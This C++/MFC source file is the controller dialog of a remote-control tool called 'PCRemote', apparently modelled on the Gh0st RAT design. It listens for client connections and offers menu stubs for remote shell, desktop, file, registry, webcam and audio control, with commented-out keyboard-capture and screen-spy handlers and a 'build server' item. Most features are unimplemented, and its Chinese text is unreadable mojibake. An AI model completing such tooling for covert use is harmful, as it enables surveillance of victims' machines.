
// PCRemoteDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "PCRemote.h"
#include "PCRemoteDlg.h"
#include "afxdialogex.h"
#include "SettingDlg.h"
#include "..\common\macros.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);

typedef struct
{
	char *title;
	int  nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Online_Data[] =
{
	{"IP",				148	},
	{"����",			150	},
	{"�������/��ע",	160	},
	{"����ϵͳ",		128	},
	{"CPU",				80	},
	{"����ͷ",			81	},
	{"PING",			81	}
};

int g_Column_Online_Count = 7;//online�б� �еĸ���
int g_Column_Online_Width = 0;//online�б��ܿ��

COLUMNSTRUCT g_Column_Message_Data[] = 
{
	{"��Ϣ����",		68	},
	{"ʱ��",			100	},
	{"��Ϣ����",	    660	}
};

int g_Column_Message_Count= 3;//Message�б� �еĸ���
int g_Column_Message_Width = 0;//Message�б��ܿ��


CIOCPServer *m_iocpServer = NULL;
CPCRemoteDlg *g_pPCRemoteDlg = NULL;

// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CPCRemoteDlg �Ի���




CPCRemoteDlg::CPCRemoteDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CPCRemoteDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	iCount = 0;
	g_pPCRemoteDlg = this;
}

void CPCRemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CPCRemoteDlg::OnNMRClickOnline)
	ON_COMMAND(IDM_ONLINE_AUDIO, &CPCRemoteDlg::OnOnlineAudio)
	ON_COMMAND(IDM_ONLINE_CMD, &CPCRemoteDlg::OnOnlineCmd)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CPCRemoteDlg::OnOnlineDesktop)
	ON_COMMAND(IDM_ONLINE_FILE, &CPCRemoteDlg::OnOnlineFile)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CPCRemoteDlg::OnOnlineProcess)
	ON_COMMAND(IDM_ONLINE_REGEDIT, &CPCRemoteDlg::OnOnlineRegedit)
	ON_COMMAND(IDM_ONLINE_SERVER, &CPCRemoteDlg::OnOnlineServer)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CPCRemoteDlg::OnOnlineVideo)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CPCRemoteDlg::OnOnlineWindow)
	ON_COMMAND(IDM_ONLINE_DELETE, &CPCRemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_MAIN_ABOUT, &CPCRemoteDlg::OnMainAbout)
	ON_COMMAND(IDM_MAIN_BUILD, &CPCRemoteDlg::OnMainBuild)
	ON_COMMAND(IDM_MAIN_CLOSE, &CPCRemoteDlg::OnMainClose)
	ON_COMMAND(IDM_MAIN_SET, &CPCRemoteDlg::OnMainSet)

	//�Զ�����Ϣ
	ON_MESSAGE(UM_ICONNOTIFY, OnIconNotify)  
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)

	ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
	ON_COMMAND(IDM_NOTIFY_SHOW, &CPCRemoteDlg::OnNotifyShow)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CPCRemoteDlg ��Ϣ�������

void CALLBACK CPCRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			//g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			//ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			//ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}

void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];      //�������ClientContext �ṹ���int m_Dialog[2];

	// �������ڴ���
	/*if (pContext->m_Dialog[0] > 0)                //����鿴�Ƿ������ֵ�ˣ������ֵ�˾Ͱ����ݴ������ܴ��ڴ���
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}*/

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])   //���û�и�ֵ���ж��Ƿ������߰��ʹ򿪹��ܹ��ܴ���
	{                                                           //�����ص�ClientContext�ṹ��
	/*case TOKEN_AUTH: // Ҫ����֤
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // �ظ�������
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;*/
	case TOKEN_LOGIN: // ���߰�

		{
			//���ﴦ������
			if (m_iocpServer->m_nMaxConnections <= g_pPCRemoteDlg->m_CList_Online.GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pPCRemoteDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);   
			}
			// ����
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;
	/*case TOKEN_DRIVE_LIST: // �������б�
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����,̫��
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // ����ͷ
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // ����
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;*/
		// ����ֹͣ��ǰ����
	default:
		closesocket(pContext->m_Socket);
		break;
	}
}


void CPCRemoteDlg::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	// ����IPCP������
	if (m_iocpServer->Initialize(NotifyProc, NULL, nMaxConnections, nPort))
	{

		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{ 
			for ( int i=0; ; i++ )
			{ 
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				str += "/";
			}
		}

		str.Format("�����˿�: %d�ɹ�", nPort);
		ShowMessage(true, str);
	}
	else
	{
		str.Format("�����˿�: %dʧ��", nPort);
		ShowMessage(false, str);
	}
}

// ��ʼ����
void CPCRemoteDlg::ListenPort(void)
{
	int nPort = ((CPCRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");
	int	nMaxConnection = ((CPCRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");

	if(nPort == 0)
		nPort = 3000;
	if(nMaxConnection == 0)
		nMaxConnection = 10000;

	Activate(nPort, nMaxConnection);
}


BOOL CPCRemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������
	m_MainMemu.LoadMenu(IDR_MENU_MAIN);			//�������˵�
	SetMenu(&m_MainMemu);

	InitList();//��ʼ���б�
	CreateStatusBar();
	CreateToolBar();

	nid.cbSize			 = sizeof(nid);
	nid.hWnd			 = m_hWnd;
	nid.uID				 = IDR_MAINFRAME;
	nid.uFlags			 = NIF_MESSAGE | NIF_ICON | NIF_TIP;
	nid.uCallbackMessage = UM_ICONNOTIFY;
	nid.hIcon			 = m_hIcon;
	CString str("PCRemoteԶ��Э�����");
	lstrcpyn(nid.szTip, (LPCSTR)str, sizeof(nid.szTip)/sizeof(nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &nid);	//��ʾ����

	ShowMessage(true,"�����ʼ���ɹ�...");

	CRect rect;
	GetWindowRect(rect);
	rect.bottom += 20;
	MoveWindow(rect);

	ListenPort();		//��ʼ�����˿�
	//test();
	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CPCRemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CPCRemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CPCRemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CPCRemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: �ڴ˴������Ϣ����������
	double dcx = cx; //��ǰ�Ի�����ܿ��

	if (SIZE_MINIMIZED == nType)
	{
		return ;
	}

	if (m_CList_Online.m_hWnd != NULL)
	{
		CRect rc;
		rc.left		= 1;
		rc.top		= 80;
		rc.right	= cx-1;
		rc.bottom	= cy-160;
		m_CList_Online.MoveWindow(rc);
		
		for (int i = 0; i < g_Column_Online_Count; i++)
		{
			double dd = g_Column_Online_Data[i].nWidth;
			dd /= g_Column_Online_Width;
			dd *= dcx;
			int lenth = dd;
			m_CList_Online.SetColumnWidth(i, lenth);
		}
	}

	if (m_CList_Message.m_hWnd != NULL)
	{
		CRect rc;
		rc.left		= 1;
		rc.top		= cy-156;
		rc.right	= cx-1;
		rc.bottom	= cy-20;
		m_CList_Message.MoveWindow(rc);

		for (int i = 0; i < g_Column_Message_Count; i++)
		{
			double dd = g_Column_Message_Data[i].nWidth;
			dd /= g_Column_Message_Width;
			dd *= dcx;
			int lenth = dd;
			m_CList_Message.SetColumnWidth(i, lenth);
		}
	}

	if (m_StatusBar.m_hWnd != NULL)
	{
		CRect rc;
		rc.top		= cy-20;
		rc.left		= 0;
		rc.right	= cx;
		rc.bottom	= cy;
		m_StatusBar.MoveWindow(rc);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_POPOUT, cx-10);
	}

	if (m_ToolBar.m_hWnd != nullptr)
	{
		CRect rc;
		rc.left = rc.top = 0;
		rc.right = cx;
		rc.bottom = 80;
		m_ToolBar.MoveWindow(rc);
	}
}

//��ʼ���б�
int CPCRemoteDlg::InitList(void)
{
	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	for (int i = 0; i < g_Column_Online_Count; i++)
	{
		m_CList_Online.InsertColumn(i, g_Column_Online_Data[i].title, LVCFMT_CENTER, g_Column_Online_Data[i].nWidth);
		g_Column_Online_Width += g_Column_Online_Data[i].nWidth;
	}

	for (int i = 0; i < g_Column_Message_Count; i++)
	{
		m_CList_Message.InsertColumn(i, g_Column_Message_Data[i].title, LVCFMT_CENTER, g_Column_Message_Data[i].nWidth);
		g_Column_Message_Width += g_Column_Message_Data[i].nWidth;
	}
	return 0;
}



// add to online list
void CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing)
{
	m_CList_Online.InsertItem(0, strIP);
	m_CList_Online.SetItemText(0, ONLINELIST_ADDR, strAddr);
	m_CList_Online.SetItemText(0, ONLINELIST_COMPUTER_NAME, strPCName);
	m_CList_Online.SetItemText(0, ONLINELIST_OS, strOS);
	m_CList_Online.SetItemText(0, ONLINELIST_CPU, strCPU);
	m_CList_Online.SetItemText(0, ONLINELIST_VIDEO, strVideo);
	m_CList_Online.SetItemText(0, ONLINELIST_PING, strPing);
	ShowMessage(true, strIP+"��������");
}


// show msg
void CPCRemoteDlg::ShowMessage(bool bIsOK, CString strMsg)
{
	CString strIsOK, strTime;

	CTime t = CTime::GetCurrentTime();
	strTime = t.Format("%H:%M:%S");

	strIsOK = bIsOK ? "ִ�гɹ�" : "ִ��ʧ��";

	m_CList_Message.InsertItem(0, strIsOK);
	m_CList_Message.SetItemText(0, 1, strTime);
	m_CList_Message.SetItemText(0, 2, strMsg);

	if (strMsg.Find("����") > 0)
	{
		iCount++;
	}else if (strMsg.Find("����") > 0 || strMsg.Find("�Ͽ�") >0)
	{
		iCount--;
	} 

	iCount = iCount < 0 ? 0 : iCount;
	CString strStatusMsg;
	strStatusMsg.Format("����:%d", iCount);
	m_StatusBar.SetPaneText(0, strStatusMsg);


}


// void CPCRemoteDlg::test(void)
// {
// 	AddList("192.168.0.1","����������","Lang","Windows7","2.2GHZ","��","123232");
// 	AddList("192.168.0.2","����������","Lang","Windows7","2.2GHZ","��","123232");
// 	AddList("192.168.0.3","����������","Lang","Windows7","2.2GHZ","��","123232");
// }


void CPCRemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CMenu popup;
	popup.LoadMenu(IDR_MENU_ONLINE);
	CMenu *pM = popup.GetSubMenu(0);
	CPoint p;
	GetCursorPos(&p);
	UINT count = pM->GetMenuItemCount();

	if (m_CList_Online.GetSelectedCount() == 0)
	{
		for (UINT i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION|MF_DISABLED|MF_GRAYED);
		}
	}
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}


void CPCRemoteDlg::OnOnlineAudio()
{
	// TODO: �ڴ���������������
	MessageBox("��������");
}


void CPCRemoteDlg::OnOnlineCmd()
{
	// TODO: �ڴ���������������
	MessageBox("�ն˹���");
}


void CPCRemoteDlg::OnOnlineDesktop()
{
	// TODO: �ڴ���������������
	MessageBox("�������");
}


void CPCRemoteDlg::OnOnlineFile()
{
	// TODO: �ڴ���������������
	MessageBox("�ļ�����");
}


void CPCRemoteDlg::OnOnlineProcess()
{
	// TODO: �ڴ���������������
	MessageBox("���̹���");
}


void CPCRemoteDlg::OnOnlineRegedit()
{
	// TODO: �ڴ���������������
	MessageBox("ע������");
}


void CPCRemoteDlg::OnOnlineServer()
{
	// TODO: �ڴ���������������
	MessageBox("�������");
}


void CPCRemoteDlg::OnOnlineVideo()
{
	// TODO: �ڴ���������������
	MessageBox("��Ƶ����");
}


void CPCRemoteDlg::OnOnlineWindow()
{
	// TODO: �ڴ���������������
	MessageBox("���ڹ���");
}


void CPCRemoteDlg::OnOnlineDelete()
{
	// TODO: �ڴ���������������
	CString strIP;
	int nSelect = m_CList_Online.GetSelectionMark();
	strIP = m_CList_Online.GetItemText(nSelect, ONLINELIST_IP);
	m_CList_Online.DeleteItem(nSelect);
	strIP += " �Ͽ�����";
	ShowMessage(true, strIP);
}


void CPCRemoteDlg::OnMainAbout()
{
	// TODO: �ڴ���������������
	CAboutDlg dlgAbout;
	dlgAbout.DoModal();
}


void CPCRemoteDlg::OnMainBuild()
{
	// TODO: �ڴ���������������
	MessageBox("���ɷ����");
}


void CPCRemoteDlg::OnMainClose()
{
	// TODO: �ڴ���������������
	PostMessage(WM_CLOSE, 0, 0);
}


void CPCRemoteDlg::OnMainSet()
{
	// TODO: �ڴ���������������
	//MessageBox("��������");
	CSettingDlg dlg;
	dlg.DoModal();
}

static UINT indicators[] =
{
	IDR_STATUSBAR_STRING
};



// create statusbar
void CPCRemoteDlg::CreateStatusBar(void)
{
	if (!m_StatusBar.Create(this) || 
		!m_StatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT)))
	{
		TRACE("Failed to create status bar\n");
		return ;
	}
}


void CPCRemoteDlg::CreateToolBar(void)
{
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))
	{
		TRACE0("Failed to create toolbar\n");
		return;      // fail to create
	}
	m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_ToolBar.LoadTrueColorToolBar
		(
		48,    //������ʹ�����
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
		);
	RECT rt,rtMain;
	GetWindowRect(&rtMain);
	rt.left=0;
	rt.top=0;
	rt.bottom=80;
	rt.right=rtMain.right-rtMain.left+10;
	m_ToolBar.MoveWindow(&rt,TRUE);

	m_ToolBar.SetButtonText(0,"�ն˹���");  
	m_ToolBar.SetButtonText(1,"���̹���"); 
	m_ToolBar.SetButtonText(2,"���ڹ���"); 
	m_ToolBar.SetButtonText(3,"�������"); 
	m_ToolBar.SetButtonText(4,"�ļ�����"); 
	m_ToolBar.SetButtonText(5,"��������"); 
	m_ToolBar.SetButtonText(6,"��Ƶ����"); 
	m_ToolBar.SetButtonText(7,"�������"); 
	m_ToolBar.SetButtonText(8,"ע������"); 
	m_ToolBar.SetButtonText(10,"��������"); 
	m_ToolBar.SetButtonText(11,"���ɷ����"); 
	m_ToolBar.SetButtonText(12,"����"); 
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);
}


LRESULT CPCRemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
	switch((UINT)lParam)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONDBLCLK:
		if(IsIconic())
			ShowWindow(SW_RESTORE);
		else if (!IsWindowVisible())
			ShowWindow(SW_SHOW);
		else
			ShowWindow(SW_HIDE);	
		break;
	case WM_RBUTTONDOWN:
		CMenu menu;
		menu.LoadMenu(IDR_MENU_NOTIFY);
		CPoint point;
		GetCursorPos(&point);

		if (!IsWindowVisible() || IsIconic())
			menu.ModifyMenu(IDM_NOTIFY_SHOW, MF_STRING, IDM_NOTIFY_SHOW, "��ʾ����");

		::SetForegroundWindow(nid.hWnd);
		menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON|TPM_RIGHTBUTTON,
			point.x, point.y, this, NULL);
		break;
	}

	return 0;
}

void CPCRemoteDlg::OnNotifyClose()
{
	// TODO: �ڴ���������������
	PostMessage(WM_CLOSE);
}


void CPCRemoteDlg::OnNotifyShow()
{
	// TODO: �ڴ���������������
	if(IsIconic())
		ShowWindow(SW_RESTORE);
	else if (!IsWindowVisible())
		ShowWindow(SW_SHOW);
	else
		ShowWindow(SW_HIDE);
}


void CPCRemoteDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	Shell_NotifyIcon(NIM_DELETE, &nid); //����ͼ��
	CDialogEx::OnClose();
}

CString CPCRemoteDlg::GetOSDisplayString(OSVERSIONINFOEX& osvi)
{
	CString strOS;
	SYSTEM_INFO si;
	PGNSI pGNSI;

	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle("kernel32.dll"), "GetNativeSystemInfo");
	if(NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);

	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId &&
		osvi.dwMajorVersion > 4)
	{
		if (osvi.dwMajorVersion == 6)
		{
			if(osvi.dwMinorVersion == 0)
				strOS = (osvi.wProductType == VER_NT_WORKSTATION) ? "Windows Vista" : "Windows Server 2008";

			if(osvi.dwMinorVersion == 1)
				strOS = (osvi.wProductType == VER_NT_WORKSTATION) ? "Windows 7" : "Windows Server 2008 R2";

			if(osvi.dwMinorVersion == 2)
				strOS = (osvi.wProductType == VER_NT_WORKSTATION) ? "Windows 8" : "Windows Server 2012";
		}

		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2)
		{
			if(GetSystemMetrics(SM_SERVERR2))
				strOS = "Windows Server 2003 R2";
			else if(osvi.wSuiteMask & VER_SUITE_STORAGE_SERVER)
				strOS = "Windows Storage Server 2003";
			else if(osvi.wSuiteMask & VER_SUITE_WH_SERVER)
				strOS = "Windows Home Server";
			else if(osvi.wProductType == VER_NT_WORKSTATION && si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				strOS = "Windows XP Professional x64 Edition";
			else 
				strOS = "Windows Server 2003";
		}

		if(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
			strOS = "Windows XP";

		if(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
			strOS = "Windows 2000";
	}
}

LRESULT CPCRemoteDlg::OnAddToList(WPARAM wParam,LPARAM lParam)
{
	CString strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing;
	ClientContext *pContext = (ClientContext*)lParam;

	if(!pContext)
		return -1;

	try
	{
		if(pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO *pLoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();

		sockaddr_in sockAddr;
		ZeroMemory(&sockAddr, sizeof(sockaddr_in));
		int nSockAddrLen = sizeof(sockAddr);

		int nRet = getpeername(pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
		strIP = (nRet != SOCKET_ERROR) ? inet_ntoa(sockAddr.sin_addr) : "";
		strPCName = pLoginInfo->HostName;
	}
	catch (...){}
}